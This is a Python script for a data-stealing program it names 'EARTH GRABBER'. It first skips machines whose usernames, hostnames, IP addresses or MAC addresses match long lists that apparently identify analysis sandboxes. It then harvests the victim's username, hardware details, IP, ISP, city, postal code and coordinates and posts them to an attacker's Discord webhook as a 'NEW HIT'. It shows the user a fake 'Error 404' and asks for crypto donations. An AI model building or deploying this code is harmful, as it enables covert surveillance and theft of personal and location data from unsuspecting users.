import psutil
from datetime import datetime
import requests
import getpass
import uuid
import socket
import time
import platform
import psutil
import datetime
import psutil
import GPUtil

blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
                                 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'd60cabe7b998', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', 'runner']
blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O',
                                   'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
blackListedIPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209',
                               '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107', '34.83.53.120']
blackListedMac = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77',
                                '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e', 'bd:c4:4b:51:d8:ae']

def is_blacklisted(value, blacklist):
    """
    Check if a value exists in the blacklist.
    """
    return value in blacklist

def get_uptime():
    boot_time = psutil.boot_time()
    current_time = datetime.datetime.now().timestamp() 
    uptime_seconds = current_time - boot_time
    uptime_hours = uptime_seconds / 3600
    uptime_days = uptime_hours / 24
    return uptime_hours, uptime_days

def send_info(user, pc_name, hwid, ip_address):
    if (
        is_blacklisted(user, blackListedUsers)
        or is_blacklisted(pc_name, blackListedPCNames)
        or is_blacklisted(hwid, blackListedMac)
        or is_blacklisted(ip_address, blackListedIPS)
    ):
        print("User blacklisted")
    else:
        # Get IP address from ipify API
        Api1 = 'https://ipinfo.io/json?format=json&token=8d8303d1900bbe'
        response1 = requests.get(Api1)


# Get IP address from ipify API
# API1
Api1 = 'https://ipinfo.io/json?format=json&token=8d8303d1900bbe'
response1 = requests.get(Api1)
data1 = response1.json()

# API2
Api2 = "https://ipapi.co/json/"
response2 = requests.get(Api2)
data2 = response2.json()

# PC INFO
username = getpass.getuser()
cpu_cores = psutil.cpu_count(logical=False)
mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])
windows_version = platform.platform()
gpus = GPUtil.getGPUs()
gpus = GPUtil.getGPUs()
gpu_type = gpus[0].name if gpus else "GPU information not available"
ram_size = psutil.virtual_memory().total // (1024 ** 3)  # Convert bytes to GB
drive_type = psutil.disk_partitions(all=False)[0].fstype
hostnamepc = socket.gethostname()
uptime_hours, uptime_days = get_uptime()
# WIFI INFO
ip = data1['ip']
coordinates = data1['loc']
ISP = data1['org']
WifiHost = data1['hostname']
timezone = data1['timezone']
country = data1['country']
disk_usage = psutil.disk_usage('/')
total_space = disk_usage.total
available_space = disk_usage.free
ASN = data2['asn']
Networktype = data2['network']
version = data2['version']
zip_code = data1['postal']
city = data1['city']
region = data1['region']

WEBHOOK_URL = 'YOUR URL HERE'

WifiInfo = {
    'title': '<:Wifi:1119002053042262168> WIFI INFO <:Wifi:1119002053042262168>',
    'description': f':globe_with_meridians: **ISP** :globe_with_meridians:\n'
                   f':globe_with_meridians: `{ISP}` :globe_with_meridians:\n'
                   f'\n'
                   f':signal_strength: **WifiHost** :signal_strength:\n'
                   f':signal_strength: `{WifiHost}` :signal_strength:\n'
                   f'\n'
                   f':satellite: **IP ADDRESS** :satellite:\n'
                   f':satellite: `{ip}` :satellite:\n'
                   f'\n'
                   f'<:Wifi:1119002053042262168> **WIFI VERSION** <:Wifi:1119002053042262168>\n'
                   f'<:Wifi:1119002053042262168> `{version}` <:Wifi:1119002053042262168>\n'
                   f'\n'
                   f':globe_with_meridians: **WIFI TYPE** :globe_with_meridians:\n'
                   f':globe_with_meridians: `{Networktype}` :globe_with_meridians:\n'
                   f'\n'
                   f'<:Wifi:1119002053042262168> **ASN** <:Wifi:1119002053042262168>\n'
                   f'<:Wifi:1119002053042262168> `{ASN}` <:Wifi:1119002053042262168>\n'
                   f'\n'
                   f'Donate to us! \n'
                   f'<:Btc:1119672744922062869> **BTC:** `bc1qc004ff0e9s2yr723vdg730ds9xf9gz63lgg5w0` <:Btc:1119672744922062869>\n'
                   f'<:Eth:1119672747484778507> **ETH:** `0xE8Fc2fc1c37e14eE8193809eD7440750bEE3CCC0` <:Eth:1119672747484778507>',
    'color': 0xFF0000 
}

PcInfo = {
    'title': ':desktop: PC INFO :desktop:',
    'description': f':floppy_disk: **DISK INFO :floppy_disk:**\n'
                   f':floppy_disk: **TOTAL SPACE:** `{total_space / (1024**3):.2f} GB` :floppy_disk:\n'
                   f':floppy_disk: **SPACE LEFT:** `{available_space / (1024**3):.2f} GB` :floppy_disk:\n'
                   f'\n'
                   f':floppy_disk: **DISK TYPE** :floppy_disk:\n'
                   f':floppy_disk: `{drive_type}` :floppy_disk:\n'
                   '\n'
                   f':desktop: **PC HOSTNAME** :desktop:\n'
                   f':desktop: `{hostnamepc}` :desktop:\n'
                   f'\n'
                   f':desktop: **PC USERNAME** :desktop:\n'
                   f':desktop: `{username}` :desktop:\n'
                   '\n'
                   f':cd: **MAC ADDRESS** :cd:\n'
                   f':cd: `{mac_address}` :cd:\n'
                   '\n'
                   f':diamond_shape_with_a_dot_inside: **CPU CORES** :diamond_shape_with_a_dot_inside:\n'
                   f':diamond_shape_with_a_dot_inside: `{cpu_cores}` :diamond_shape_with_a_dot_inside:\n'
                   '\n'
                   f':alarm_clock: **PC UPTIME HOURS** :alarm_clock:\n'
                   f':alarm_clock: `{uptime_hours}` :alarm_clock:\n'
                   '\n'
                   f':dividers: **RAM AMOUNT** :dividers:\n'
                   f':dividers: `{ram_size}` :dividers:\n'
                   '\n'
                   f':vhs: **GPU TYPE** :vhs:\n'
                   f':vhs: `{gpu_type}` :vhs:\n'
                   '\n'
                   f':computer: **PC TYPE** :computer:\n'
                   f':computer: `{windows_version}` :computer:\n'
                   '\n'
                   f'Donate to us!\n'
                   f'<:Btc:1119672744922062869> **BTC:** `bc1qc004ff0e9s2yr723vdg730ds9xf9gz63lgg5w0` <:Btc:1119672744922062869>\n'
                   f'<:Eth:1119672747484778507> **ETH:** `0xE8Fc2fc1c37e14eE8193809eD7440750bEE3CCC0` <:Eth:1119672747484778507>',
    'color': 0xFF0000 
}

Location = {
    'title': ':round_pushpin: **LOCATION INFO** :round_pushpin:',
    'description': f':cityscape: **CITY** :cityscape:\n'
                   f':cityscape: `{city}` :cityscape:\n'
                   f'\n'
                   f':flag_white: **COUNTRY** :flag_white:\n'
                   f':flag_white: `{country}` :flag_white:\n'
                   f'\n'
                   f':timer: **TIME ZONE** :timer:\n'
                   f':timer: `{timezone}` :timer:\n'
                   f'\n'
                   f':pushpin: **ZIPCODE** :pushpin:\n'
                   f':pushpin: `{zip_code}` :pushpin:\n'
                   f'\n'
                   f':round_pushpin: **REGION/STATE** :round_pushpin:\n'
                   f':round_pushpin: `{region}` :round_pushpin:\n'
                   f'\n'
                   f':map: **COORDINATES (estimate)** :map:\n'
                   f':map: `{coordinates}` :map:\n'
                   f'\n'
                   f'Donate to us!\n'
                   f'<:Btc:1119672744922062869> **BTC:** `bc1qc004ff0e9s2yr723vdg730ds9xf9gz63lgg5w0` <:Btc:1119672744922062869>\n'
                   f'<:Eth:1119672747484778507> **ETH:** `0xE8Fc2fc1c37e14eE8193809eD7440750bEE3CCC0` <:Eth:1119672747484778507>',
    'color': 0xFF0000 
}
# Check if the information is blacklisted before sending
if (
    is_blacklisted(username, blackListedUsers)
    or is_blacklisted(hostnamepc, blackListedPCNames)
    or is_blacklisted(mac_address, blackListedMac)
    or is_blacklisted(ip, blackListedIPS)
):
    print("User, PC name, HWID, or IP address is blacklisted. Information will not be sent.")
else:
    # Create the payload with the embeds
    payload = {
        'content': f'@everyone NEW HIT FROM {country}',
        'username': 'EARTH GRABBER',
        'avatar_url': 'https://cdn.discordapp.com/attachments/1071480942083981326/1119432050370412544/Untitled91_20230616210302.png',# Mention @here to notify everyone
        'embeds': [WifiInfo] + [PcInfo] + [Location]
    }

    # Send the webhook message with the payload
    headers = {'Content-Type': 'application/json'}
    discord_response = requests.post(WEBHOOK_URL, headers=headers, json=payload)

    # Check the response status code
    if discord_response.status_code == 204:
        print('Error 404')
    else:
        print('Error 404')

    # Print the contents of the ipify page
    if response1.status_code == 200:
        print('Error 404')
    else:
        print('Error 404')

    # Pause for a few seconds before exiting
    time.sleep(5)
    # Send the information
    send_info(username, hostnamepc, mac_address, ip)
